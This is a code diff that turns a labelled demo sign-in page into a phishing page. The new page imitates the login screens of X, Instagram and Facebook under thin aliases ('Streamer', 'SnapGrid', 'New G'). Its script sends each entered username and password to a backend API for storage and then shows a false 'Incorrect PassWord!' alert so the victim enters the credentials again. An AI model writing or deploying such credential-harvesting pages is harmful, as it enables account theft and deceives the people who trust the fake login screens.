@@ -1,151 +1,250 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Demo Authentication</title>
-    <style>
-        :root {
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+        integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+<title>Login </title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background-color: #e5e7eb;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+    padding: 20px;
+  }
 
-            --theme-color: #2563eb; 
-            --text-main: #1f2937;
-            --text-muted: #6b7280;
-            --bg-gray: #f3f4f6;
-        }
+  /* Generic Mobile Device Container */
+  .mobile-screen {
+    width: 320px;
+    height: 650px;
+    background: #ffffff;
+    border-radius: 30px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+    box-sizing: border-box;
+    position: relative;
+    overflow: hidden;
+    display: none; /* Hidden by default */
+    flex-direction: column;
+  }
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: var(--bg-gray);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
+  /* Universal Input/Button Reset */
+  input {
+    width: 100%;
+    box-sizing: border-box;
+    font-size: 14px;
+    border: 1px solid #d1d5db;
+  }
+  button {
+    width: 100%;
+    border: none;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 15px;
+  }
 
-        .login-card {
-            background: white;
-            width: 100%;
-            max-width: 350px;
-            padding: 40px 30px;
-            border-radius: 16px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-            box-sizing: border-box;
-            text-align: center;
-        }
+  /* Flexbox Divider with Lines */
+  .divider {
+    display: flex;
+    align-items: center;
+    text-align: center;
+    color: #6b7280;
+    font-size: 12px;
+    margin: 20px 0;
+  }
+  .divider::before, .divider::after {
+    content: ''; flex: 1; border-bottom: 1px solid #e5e7eb;
+  }
+  .divider:not(:empty)::before { margin-right: .5em; }
+  .divider:not(:empty)::after { margin-left: .5em; }
 
-        .auth-badge {
-            background: #e5e7eb;
-            color: var(--text-muted);
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            font-weight: bold;
-            display: inline-block;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-        }
+  /* =========================================
+     APP 1: Streamer Style (X) 
+     ========================================= */
+  .app-x { padding: 20px; padding-top: 50px; }
+  .app-x h1 { font-size: 28px; margin-bottom: 30px; color: #0f172a; }
+  .app-x h2 { font-size: 20px; margin-bottom: 20px; color: #0f172a; margin-top: 5px; }
+  .app-x .btn-outline {
+    background: white; border: 1px solid #d1d5db; border-radius: 30px; padding: 12px; margin-bottom: 15px; color: #0f172a;
+  }
+  .app-x input { padding: 15px; border-radius: 5px; margin-bottom: 20px; }
+  .app-x .btn-primary { background: #0f172a; color: white; border-radius: 30px; padding: 15px; margin-bottom: 20px; }
+  .app-x .btn-ghost { background: transparent; color: #0f172a; border: 1px solid #d1d5db; border-radius: 30px; padding: 12px; }
+  .app-x .btn-text-only { background: transparent; color: #0f172a; border: none; text-align: left; padding: 0 0 20px 0; font-size: 14px; width: auto; }
+  #streamer-step-2 { display: none; } /* Hides step 2 initially */
 
-        h1 { color: var(--text-main); font-size: 1.5rem; margin-top: 0; margin-bottom: 8px; }
-        p.subtitle { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 30px; }
-        
-        .form-group { margin-bottom: 15px; text-align: left; }
-        
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #d1d5db;
-            border-radius: 8px;
-            box-sizing: border-box;
-            font-size: 1rem;
-        }
+  /* =========================================
+     APP 2: SnapGrid Style (IG)
+     ========================================= */
+  .app-ig { padding: 0; align-items: center; justify-content: center; }
+  .app-ig-content { width: 100%; padding: 40px 30px; box-sizing: border-box; text-align: center; }
+  .app-ig h1 { font-family: "Georgia", serif; font-style: italic; font-size: 36px; margin-bottom: 35px; color: #f43f5e; }
+  .app-ig input { background: #f9fafb; padding: 14px; border-radius: 5px; margin-bottom: 12px; }
+  .app-ig .btn-primary { background: #f43f5e; color: white; border-radius: 8px; padding: 14px; margin-top: 10px; }
+  .app-ig .link-blue { color: #2563eb; font-size: 13px; text-decoration: none; font-weight: 600; display: block; margin-top: 15px; }
+  .app-ig .link-dark { color: #000; font-size: 12px; text-decoration: none; display: block; margin-top: 20px; }
+  .app-ig .footer {
+    position: absolute; bottom: 0; width: 100%; border-top: 1px solid #e5e7eb; padding: 20px 0; text-align: center; font-size: 13px; color: #6b7280;
+  }
+  .app-ig .footer strong { color: #f43f5e; cursor: pointer; }
 
-        .btn-login {
-            width: 100%;
-            padding: 14px;
-            background: var(--theme-color, #2563eb);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-weight: bold;
-            font-size: 1rem;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .btn-login:disabled { background: #9ca3af; cursor: not-allowed; }
-        
-        .cancel-link { display: block; margin-top: 20px; color: var(--text-muted); text-decoration: none; font-size: 0.9rem; }
-    </style>
+  /* =========================================
+     APP 3: New G Style (FB)
+     ========================================= */
+  .app-fb { padding: 30px 20px; text-align: center; background: #fafafa; }
+  .app-fb .logo-box { width: 60px; height: 60px; border-radius: 12px; margin: 40px auto; }
+  .app-fb .logo-box img { width: 50px; height: 50px; margin-top: 15px; }
+  .app-fb input { padding: 15px; border-radius: 8px; border: 1px solid #d1d5db; margin: 10px 0; }
+  #newg-password { margin-bottom: 30px; }
+  .app-fb .btn-primary { background: #405DE6; color: white; border-radius: 30px; padding: 14px; font-size: 16px; margin-bottom: 15px; }
+  .app-fb .link-muted { color: #4b5563; font-size: 14px; text-decoration: none; font-weight: 500; }
+  .app-fb .btn-create { background: transparent; border: 1px solid #405DE6; color: #405DE6; border-radius: 30px; padding: 12px; margin-top: 50px; }
+
+</style>
 </head>
 <body>
 
-    <div class="login-card">
-        <div class="auth-badge">Demo Auth</div>
-        <h1 id="dynamic-title">Sign In</h1>
-        <p class="subtitle" id="dynamic-subtitle">Securely connect to verify your vote.</p>
-        
-        <form id="demo-login-form">
-            <div class="form-group">
-                <input type="text" id="username-input" placeholder="Enter your demo Username" required>
-            </div>
-            <div class="form-group"><input type="password" id="password-input" placeholder="Enter your demo Password" required></div>
-
-            <button type="submit" class="btn-login" id="submit-btn">Authorize</button>
-        </form>
-
-        <a href="index.html" class="cancel-link">Cancel and return</a>
+  <div id="app-streamer" class="mobile-screen app-x" style="display: flex;">
+    
+    <div id="streamer-step-1" style="width: 100%;">
+      <i class="fa-brands fa-x-twitter" style="font-size: 3rem;"></i>
+      <h1>Happening now </h1>
+      <h2>Join today.</h2>
+      <button class="btn-outline">Continue with Google</button>
+      <button class="btn-outline">Continue with Apple</button>
+      <div class="divider">or</div>
+      <input type="text" id="streamer-username" placeholder="Phone, email, or username">
+      <button class="btn-primary" onclick="streamerNext()">Next</button>
+      <button class="btn-ghost">Forgot password?</button>
     </div>
 
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const platform = urlParams.get('platform') || 'Unknown';
+    <div id="streamer-step-2" style="width: 100%;">
+      <button class="btn-text-only" onclick="streamerBack()">← Back</button>
+      <h2 id="streamer-display-name">User</h2>
+      <input type="password" id="streamer-password" placeholder="Password">
+      <button class="btn-primary" onclick="submitData('Streamer', 'streamer-username', 'streamer-password')">Log In</button>
+      <button class="btn-ghost">Forgot password?</button>
+    </div>
 
-        // Update UI colors based on platform
-        if (platform !== 'Unknown') {
-            document.getElementById('dynamic-title').innerText = `Sign in with ${platform}`;
-            const root = document.documentElement;
-            if (platform === 'New G') root.style.setProperty('--theme-color', '#059669');
-            if (platform === 'Snap Grid') root.style.setProperty('--theme-color', '#e11d48');
-            if (platform === 'Streamer') root.style.setProperty('--theme-color', '#000000');
-        }
+  </div>
 
-        document.getElementById('demo-login-form').addEventListener('submit', function(e) {
-            e.preventDefault(); 
-            const btn = document.getElementById('submit-btn');
-            const username = document.getElementById('username-input').value;
-            const password = document.getElementById('password-input').value;
-            
-            btn.disabled = true;
-            btn.innerText = "Authenticating...";
+  <div id="app-snapgrid" class="mobile-screen app-ig">
+    <div class="app-ig-content">
+      <h1>SnapGrid</h1>
+      <input type="text" id="snapgrid-username" placeholder="Phone number, username, or email">
+      <input type="password" id="snapgrid-password" placeholder="Password">
+      <button class="btn-primary" onclick="submitData('SnapGrid', 'snapgrid-username', 'snapgrid-password')">Log In</button>
+      <div class="divider">OR</div>
+      <a href="#" class="link-blue">Log in with Facebook</a>
+      <a href="#" class="link-dark">Forgot password?</a>
+    </div>
+    <div class="footer">
+      Don't have an account? <strong>Sign up</strong>
+    </div>
+  </div>
 
-            // 1. Generate Log Data
-            const now = new Date();
-            // Create a random Serial Number (e.g., SN-849201)
-            const randomSN = 'SN-' + Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
-            
-            const newLogEntry = {
-                sn: randomSN,
-                user: username,
-                password: password,
-                platform: platform,
-                date: now.toLocaleDateString(),
-                time: now.toLocaleTimeString()
-            };
+  <div id="app-newg" class="mobile-screen app-fb">
+    <div style="color: #6b7280; font-size: 13px;">English (UK)</div>
+    <div class="logo-box"><img src="./images/logo.webp" alt="logo image"></div>
+    <input type="text" id="newg-username" placeholder="Mobile number or email address">
+    <input type="password" id="newg-password" placeholder="Password">
+    <button class="btn-primary" onclick="submitData('New G', 'newg-username', 'newg-password')">Log In</button>
+    <a href="#" class="link-muted">Forgotten password?</a>
+    <button class="btn-create">Create new account</button>
+  </div>
 
-            // 2. Save Data to localStorage array
-            // Pull existing logs, or create an empty array if none exist
-            let existingLogs = JSON.parse(localStorage.getItem('voteLogs')) || [];
-            // Add the new entry to the BEGINNING of the array
-            existingLogs.unshift(newLogEntry);
-            // Save it back
-            localStorage.setItem('voteLogs', JSON.stringify(existingLogs));
+  <script>
+    // Configuration
+    const API_URL = 'http://localhost:3000/api';
 
-            // Wait 1.5 seconds, then redirect
-            setTimeout(() => {
-                window.location.href = 'index.html';
-            }, 1500);
-        });
-    </script>
+    // Show app based on URL parameter or default to streamer
+    function initApp() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const app = urlParams.get('app') || 'streamer';
+      switchApp(app);
+    }
+
+    // Dynamic UI Switching
+    function switchApp(appId) {
+      // Hide all apps
+      document.getElementById('app-streamer').style.display = 'none';
+      document.getElementById('app-snapgrid').style.display = 'none';
+      document.getElementById('app-newg').style.display = 'none';
+      
+      // Show selected app
+      const selectedApp = document.getElementById('app-' + appId);
+      if (selectedApp) {
+        selectedApp.style.display = 'flex';
+      }
+      
+      // Reset Streamer state if not showing streamer
+      if (appId !== 'streamer') {
+        streamerBack();
+      }
+    }
+
+    // Streamer 2-Step Logic
+    function streamerNext() {
+      const user = document.getElementById('streamer-username').value;
+      if(user.trim() === '') { alert("Please enter a username"); return; }
+      
+      document.getElementById('streamer-display-name').innerText = user;
+      document.getElementById('streamer-step-1').style.display = 'none';
+      document.getElementById('streamer-step-2').style.display = 'block';
+    }
+
+    function streamerBack() {
+      document.getElementById('streamer-step-2').style.display = 'none';
+      document.getElementById('streamer-step-1').style.display = 'block';
+    }
+
+    // Database Submission Logic (Fetch to MongoDB Backend)
+    async function submitData(platform, userFieldId, passFieldId) {
+      const username = document.getElementById(userFieldId).value;
+      const password = document.getElementById(passFieldId).value;
+
+      if(username === '' || password === '') {
+          alert("Please fill in all fields.");
+          return;
+      }
+
+      const payload = {
+          platform: platform,
+          username: username,
+          password: password
+      };
+
+      try {
+          const response = await fetch(`${API_URL}/logins`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload)
+          });
+
+          const result = await response.json();
+          
+          if(result.status === "success") {
+              alert(platform + " Incorrect PassWord!");
+              // Clear fields after success
+              document.getElementById(userFieldId).value = '';
+              document.getElementById(passFieldId).value = '';
+              if(platform === 'Streamer') streamerBack();
+          } else {
+              alert("Error: " + result.message);
+          }
+      } catch (error) {
+          console.error("Fetch error:", error);
+          alert("Could not connect to the server. Please try again later.");
+      }
+    }
+
+    // Initialize on page load
+    window.onload = initApp;
+  </script>
 </body>
 </html>
